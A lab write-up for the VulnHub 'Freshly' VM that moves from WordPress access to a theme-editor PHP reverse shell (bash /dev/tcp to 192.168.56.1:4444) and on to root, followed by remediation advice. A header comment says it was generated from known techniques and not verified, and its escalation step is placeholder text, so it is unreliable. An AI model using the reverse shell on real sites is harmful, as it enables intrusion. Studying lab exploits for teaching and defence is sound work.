# TopHatSec: Freshly — Writeup

<!-- generated from known techniques; verify against live VM -->

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Easy–Intermediate |
| **OS** | Linux |
| **Root Proof** | uid=0(root) |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/tophatsec-freshly,118/) |

## Attack Summary

nmap (ports 80 + 8080 + 443) → WordPress on 8080 → `/phpmyadmin` + credentials in config → WordPress admin → plugin/theme upload → PHP reverse shell → SUID `sudo` or writable sudoers → root

## Methodology

1. Network discovery
2. Multi-port enumeration (80, 443, 8080)
3. WordPress credential extraction from config or phpMyAdmin
4. PHP reverse shell via theme editor or plugin upload
5. Privilege escalation via sudo or SUID

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.X
```

Key findings:
- Port 80: HTTP
- Port 443: HTTPS
- Port 8080: WordPress installation

---

## Step 2: WordPress Enumeration

Browse to `http://192.168.56.X:8080`. A WordPress site is running.

Enumerate with wpscan:

```bash
wpscan --url http://192.168.56.X:8080 -e u,vp
```

Check for phpMyAdmin:

```bash
dirb http://192.168.56.X /usr/share/wordlists/dirb/common.txt
# Found: /phpmyadmin
```

Also check `wp-config.php` — if accessible, credentials may be read directly. Another path is extracting DB credentials from the phpMyAdmin instance to log into WP admin.

---

## Step 3: WordPress Admin → PHP Reverse Shell

Log in to `http://192.168.56.X:8080/wp-admin`.

Navigate to **Appearance → Theme Editor → 404.php** and inject a PHP reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'"); ?>
```

Or upload a malicious plugin:

```bash
# Create plugin zip with shell.php
zip plugin.zip shell.php
# Upload via Plugins → Add New → Upload
```

Start a listener:

```bash
nc -lvp 4444
```

Trigger the shell:

```bash
curl http://192.168.56.X:8080/?p=404
```

---

## Step 4: Stabilize Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Step 5: Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Or find SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Common escalation paths on this VM:
- `sudo` with NOPASSWD for a shell command
- Writable WordPress config that can restart a root-owned service
- Kernel exploit if no sudo path available

```bash
# If sudo -l shows a writable command:
sudo <command>

# If SUID binary found:
/path/to/suid_binary

id
# uid=0(root)
cat /root/flag.txt
```

---

## Lessons Learned

1. **Multi-service enumeration** — scan all ports; services on non-standard ports (8080) are often less hardened
2. **WordPress credentials in `wp-config.php`** — DB credentials reused for admin login is a common misconfiguration
3. **Theme/plugin editor for RCE** — WordPress admin with write access to theme files = code execution
4. **phpMyAdmin on public interface** — restrict phpMyAdmin to localhost or VPN-only access

## Remediation

| Vulnerability | Fix |
|---|---|
| WordPress admin → RCE via theme editor | Disable theme/plugin editing in `wp-config.php`: `define('DISALLOW_FILE_EDIT', true)` |
| Credential reuse (DB → WP admin) | Use distinct, strong credentials for each service |
| phpMyAdmin publicly accessible | Restrict to `127.0.0.1` in Apache/Nginx config |
| Weak sudo configuration | Audit `/etc/sudoers` — avoid NOPASSWD entries |
